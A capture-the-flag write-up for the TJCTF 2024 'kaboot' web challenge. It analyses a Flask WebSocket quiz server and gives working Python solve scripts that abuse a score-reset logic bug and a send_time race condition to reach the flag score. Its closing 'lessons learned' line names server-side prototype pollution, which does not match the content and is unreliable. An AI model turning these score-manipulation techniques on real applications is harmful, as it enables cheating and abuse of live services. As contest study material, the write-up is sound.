# kaboot

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
  4. [Exploitation](#exploitation)  
    4.1. [Reset Score Logic Bug](#reset-score-logic-bug)  
    4.2. [Race Condition in `send_time` Check](#racec-ondition-in-send_time-check)  
  5. [Conclusion](#conclusion)  

## Overview

- 36 solves / 186 points
- Author: kpdfgo
- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

off-brand companies is my passion

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520124745.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520124910.png)

In here, we can click the "Create" button to create a new Kaboot room:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520124950.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520125045.png)

After clicking the "Create" button, it'll send a POST request to `/create`, and it'll redirect us to `/room/<room_id>`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520125141.png)

In this room endpoint, it uses WebSocket to communicate with the server:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520125236.png)

In the first 2 WebSocket messages, the server sends to us with the room's name and the question's information, such as question, answers.

After creating a new room, we can submit one of those answers to answer the question:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520130313.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520130321.png)

Burp Suite WebSockets history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/images/Pasted%20image%2020240520130345.png)

When we submitted an answer, we'll send a WebSocket message to the server with the following **base64 encoded JSON data**:

```json
{"id":"427c3b8f-89ab-9477-cd87-1da95160173b","answer":1,"send_time":1716181382.9278429}
```

If it's correct, the server adds our score.

Hmm... There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/TJCTF-2024/web/kaboot/server.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/TJCTF-2024/web/kaboot)-[2024.05.20|13:07:31(HKT)]
└> file server.zip 
server.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/TJCTF-2024/web/kaboot)-[2024.05.20|13:07:34(HKT)]
└> unzip server.zip              
Archive:  server.zip
   creating: server/
  inflating: server/Dockerfile       
   creating: server/static/
  inflating: server/static/script.js  
  inflating: server/static/main.css  
  inflating: server/static/room.css  
  inflating: server/app.py           
   creating: server/templates/
  inflating: server/templates/create.jinja  
  inflating: server/templates/room.jinja  
  inflating: server/kahoot.json      
  inflating: server/flag.txt         
```

After reviewing the source code, we have the following findings:

**`server/kahoot.json`:**
```json
{"name": "swiftie-core", "questions": [{"question": "what is the best taylor swift song?", "answers": ["cruel summer", "daylight (stosp's version)", "all too well (10 minute version)", "all too well (5 minute version)"], "answer": 1}, {"question": "can I ask you a question???", "answers": ["me-hee-hee", "what did you do???", "por supuesto", "did you ever have someone kiss you in a crowded room?"], "answer": 3}, {"question": "what was the last song I cried to?", "answers": ["all too well", "all too well", "all too well", "all too well"], "answer": 1}, {"question": "what is the better version?", "answers": ["both", "taylor's version", "the original", "neither"], "answer": 1}, {"question": "when did I last listen to taylor swift?", "answers": ["last month", "yesterday", "today", "last week"], "answer": 3}, {"question": "how was the eras tour?", "answers": ["idk I couldn't get tickets", "star-struck", "I slept through it", "a fever dream"], "answer": 3}, {"question": "what is the best taylor swift lyric?", "answers": ["you and me, that's my whole world", "i'm standing at the restaurant", "i'm a mess, but i'm the mess that you wanted", "i'd be a fearless leader"], "answer": 2}, {"question": "why am I crying right now?", "answers": ["I just watched the all too well short film", "get help", "I'm listening to all too well", "idk man"], "answer": 3}, {"question": "when was taylor swift born?", "answers": ["7776", "4321", "1989", "1987"], "answer": 2}, {"question": "what is?", "answers": ["meow meow meow meow", "meow meow meow", "meow meow meow meow meow meow", "meow meow meow meow meow"], "answer": 3}]}
```

In here, we can see **all the room's questions and their correct answer** are stored this JSON file.

**`server/app.py`, WebSocket route `/room/<room_id>`:**
```python
[...]
from flask_sock import Sock
[...]
flag = open('flag.txt').read().strip()

with open('kahoot.json') as f:
    kahoot = json.load(f)
[...]
@sock.route('/room/<room_id>')
def room_sock(sock, room_id):
    [...]
    scores = get_room_scores(room_id)
    for i, q in enumerate(kahoot['questions']):
        [...]

    sock.send(b64encode(json.dumps({
        'scores': scores,
        'end': True,
        'message': f'omg congrats, swiftie!!! {flag}' if get_score(scores, room_id, data['id']) >= 1000 * len(kahoot['questions']) else 'sucks to suck brooooooooo'
    }).encode()))
[...]
```

```shell
┌[siunam♥Mercury]-(~/ctf/TJCTF-2024/web/kaboot/server)-[2024.05.20|13:08:02(HKT)]
└> python3                   
[...]
>>> import json
>>> with open('kahoot.json') as f:
...     kahoot = json.load(f)
... 
>>> len(kahoot['questions'])
10
>>> 1000 * len(kahoot['questions'])
10000
```

In here, we can see that **when our score is greater or equal to `10000`, we can get the flag**.

Which means our objective in this challenge is to **make our score `>= 10000`.**

**In the same WebSocket route, we can see how the server handles the questions and answers:**
```python
[...]
from time import time
[...]
@sock.route('/room/<room_id>')
def room_sock(sock, room_id):
    sock.send(b64encode(kahoot['name'].encode()))
    scores = get_room_scores(room_id)
    for i, q in enumerate(kahoot['questions']):
        sock.send(b64encode(json.dumps({
            'send_time': time(),
            'scores': scores,
            **q,
        }).encode()))
        
        data = sock.receive()
        data = json.loads(b64decode(data).decode())
        [...]
```

First, the server loops through all the questions **one by one** in the `kahoot.json` JSON file.

Then, the server sends a base64 encoded JSON data to the client, which includes the current question and answer information, **the current time in epoch format (`send_time`)**, and the current room's scores (`scores`).

After that, the server **waits the client to send a WebSocket message**. When the server received the client's message, it'll base64 decode the message and parse the decoded JSON data into a Python object.

Next, the server **checks the client's `send_time` is faster than the current time**. If it is, the server sends a WebSocket message with `message` `???` and end the current room:

```python
    for i, q in enumerate(kahoot['questions']):
        [...]
        send_time = data['send_time']
        recv_time = time()

        if (scores := get_room_scores(room_id)) is not None and send_time >= time():
            sock.send(b64encode(json.dumps({
                'scores': scores,
                'end': True,
                'message': '???'
            }).encode()))
            return
        [...]
```

After checking the client's WebSocket message's `send_time`, if the question is **the first question**, it'll **reset the client's score to `0`**:

```python
[...]
def edit_score(scores, room_id, uid, new_score):
    for i, score_data in enumerate(scores):
        if score_data[1] == uid:
            scores[i][2] = new_score
            return scores

    all_scores.append([room_id, uid, new_score])
    scores.append(all_scores[-1])
    return scores
[...]
@sock.route('/room/<room_id>')
def room_sock(sock, room_id):
    [...]
    for i, q in enumerate(kahoot['questions']):
        [...]
        if i == 0:
            edit_score(scores, room_id, data['id'], 0)
        [...]
```

Finally, the server checks the client's `answer` is same as the current question's answer. If the client's `answer` is correct, the server adds the client's score. The maximum new score is `1000`, minimum `500`. **This calculation is based on the client's `send_time` and the server's `recv_time`**:

```python
    for i, q in enumerate(kahoot['questions']):
        [...]
        if data['answer'] == q['answer']:
            edit_score(scores,
                       room_id,
                       data['id'],
                       get_score(scores, room_id, data['id']) + 1000 + max((send_time - recv_time) * 50, -500))
```

Hmm... Can we somehow **exploit the answer checking logic and gain more than `9999` score**??

**Right off the bat, when I first reviewed this WebSocket route, the client's `send_time` check is very odd to me:**
```python
        [...]
        send_time = data['send_time']
        recv_time = time()
        
        if (scores := get_room_scores(room_id)) is not None and send_time >= time():
            [...]
```

**Let's get rid off the `scores` condition for simplicity:**  
```python
        [...]
        send_time = data['send_time']
        recv_time = time()
        
        if send_time >= time():
            [...]
```

Huh? Why would the server checks the client's `send_time` with another `time()` function call **instead of the `recv_time`**??

That being said, in theory, we could exploit the race condition within a tiny **race window**, which causes the server to **add more than `1000` score** to our score.

**Here's the PoC (Proof-of-Concept):**
```python
from time import time

def race():
    RACE_WINDOW = 0.00000055 # feel free to adjust this value
    send_time = time() + RACE_WINDOW
    recv_time = time()

    if send_time >= time():
        print('[-] We\'re sending too fast!')
        return

    new_score = 1000 + max((send_time - recv_time) * 50, -500)
    print(f'[+] New score: {new_score}')

if __name__ == '__main__':
    for _ in range(10):
        race()
```

```shell
┌[siunam♥Mercury]-(~/ctf/TJCTF-2024/web/kaboot)-[2024.05.20|14:14:32(HKT)]
└> python3 ws_race_window.py
[-] We're sending too fast!
[+] New score: 999.999988079071
[-] We're sending too fast!
[-] We're sending too fast!
[-] We're sending too fast!
[+] New score: 1000.000011920929
[-] We're sending too fast!
[+] New score: 1000.0
[-] We're sending too fast!
[-] We're sending too fast!
```

In our local environment, the race window would be tiny, but not in the challenge's remote instance.

Hmm... What else we can also abuse... The **score reset**?

```python
    [...]
    for i, q in enumerate(kahoot['questions']):
        [...]
        if i == 0:
            edit_score(scores, room_id, data['id'], 0)
        [...]
```

As you can see, the score reset only happens during **the first question**!

If we look closely at the `edit_score()` function call, we can see that **the client's provided `id`** is parsed into that function.

Ah ha! What if we **first reset a dummy ID's score**, and **then continue with another ID**?

## Exploitation

### Reset Score Logic Bug

Armed with above information, we can abuse the reset score logic bug to gain more than `9999` score!

**To do so, I'll write a Python solve script:**
```python
import websockets
import asyncio
import json
import base64
import time
import re

async def exploit(url):
    QUESTION_LENGTH = 10
    LOCAL_FLAG_FORMAT = r'(flag\{[ -z|~]+\})'
    FLAG_FORMAT = r'(tjctf\{[ -z|~]+\})'
    try:
        async with websockets.connect(url) as websocket:
            message = await websocket.recv() # room's title name message

            for i in range(QUESTION_LENGTH):
                message = await websocket.recv() # question and answer information message
                question = json.loads(base64.b64decode(message).decode())
                answer = question['answer']

                id = '1' if i == 0 else '2'
                sendTime = time.time()
                encodedMessage = base64.b64encode('{{"id":"{0}","answer":{1},"send_time":{2}}}'.format(id, answer, sendTime).encode())
                await websocket.send(encodedMessage)

            message = await websocket.recv() # final answer's information
            finalMessage = json.loads(base64.b64decode(message).decode())
            if 'omg congrats' not in finalMessage['message']:
                print('[-] Current score is <= 10000')
            else:
                if (flagMatch := re.search(FLAG_FORMAT, finalMessage['message'])) or (flagMatch := re.search(LOCAL_FLAG_FORMAT, finalMessage['message'])):
                    flag = flagMatch.group(0)
                    print(f'[+] Current score is >= 10000. Here\'s the flag: {flag}')
    except websockets.exceptions.ConnectionClosedError:
        print('[*] Connection closed')

if __name__ == "__main__":
    # url = "ws://localhost:5000/room/literally_anything" # local testing
    url = "wss://kaboot-0af29d2ec5fe4b03.tjc.tf/room/literally_anything" # remote instance

    ATTEMPT = 2 # run twice to gain score >= 10000
    for i in range(ATTEMPT):
        print(f'[*] Attempt {i + 1}...')
        asyncio.run(exploit(url))
```

```shell
┌[siunam♥Mercury]-(~/ctf/TJCTF-2024/web/kaboot)-[2024.05.20|15:09:46(HKT)]
└> python3 solve_logic_bug.py
[*] Attempt 1...
[-] Current score is <= 10000
[*] Attempt 2...
[+] Current score is >= 10000. Here's the flag: tjctf{t00_sw1ft_f0r_y0u_b0iiiiii_2cfdfa7a}
```

Nice! We successfully exploited the reset score logic bug to gain more than `9999` score! 

- **Flag: `tjctf{t00_sw1ft_f0r_y0u_b0iiiiii_2cfdfa7a}`**

### Race Condition in `send_time` Check

**We can also exploit the race condition in the client's `send_time` condition via this Python solve script:**
```python
import websockets
import asyncio
import json
import base64
import time
import re

allScores = list()

async def exploit(url, raceWindow):
    QUESTION_LENGTH = 10
    LOCAL_FLAG_FORMAT = r'(flag\{[ -z|~]+\})'
    FLAG_FORMAT = r'(tjctf\{[ -z|~]+\})'
    try:
        async with websockets.connect(url) as websocket:
            message = await websocket.recv() # room's title name message

            for i in range(QUESTION_LENGTH):
                message = await websocket.recv() # question and answer information message
                question = json.loads(base64.b64decode(message).decode())
                if i != 0:
                    LastKnownScore = question['scores'][-1][2]
                    print(f'[*] Last known score: {LastKnownScore}')
                if 'message' in question and question['message'] == '???':
                    print('[-] You\'re sending too fast! Adjust the race window to a *lower* value!')
                    return

                answer = question['answer']
                ID = '1'
                sendTime = time.time() + raceWindow

                encodedMessage = base64.b64encode('{{"id":"{0}","answer":{1},"send_time":{2}}}'.format(ID, answer, sendTime).encode())
                await websocket.send(encodedMessage)

            message = await websocket.recv() # final answer's information
            finalMessage = json.loads(base64.b64decode(message).decode())
            finalScore = finalMessage['scores'][-1][2]
            print(f'[*] Final score: {finalScore}')
            allScores.append(finalScore)
            
            if finalMessage['message'] == '???':
                print('[-] You\'re sending too fast! Adjust the race window to a *lower* value!')
            elif finalMessage['message'] == 'sucks to suck brooooooooo':
                print('[-] Current score is <= 10000. Adjust the race window to a *higher* value!')
            elif 'omg congrats' in finalMessage['message']:
                if (flagMatch := re.search(FLAG_FORMAT, finalMessage['message'])) or (flagMatch := re.search(LOCAL_FLAG_FORMAT, finalMessage['message'])):
                    flag = flagMatch.group(0)
                    print(f'[+] Current score is >= 10000. Here\'s the flag: {flag}')
                    exit(0)
    except websockets.exceptions.ConnectionClosedError:
        print('[*] Connection closed')

if __name__ == "__main__":
    # url = "ws://localhost:5000/room/literally_anything" # local testing
    url = "wss://kaboot-e29d3ec9287c0db8.tjc.tf/room/literally_anything" # remote instance

    raceWindow = 0.10555555 # adjust this race window value
    ATTEMPT = 100
    for i in range(ATTEMPT):
        print(f'[*] Attempt {i + 1}...')
        asyncio.run(exploit(url, raceWindow))
    
    highestScore = max(allScores)
    print(f'[*] Highest score: {highestScore}')
```

However, this takes a lot of attempts to gain more than `9999` score.

## Conclusion

What we've learned:

1. Server-Side Prototype Pollution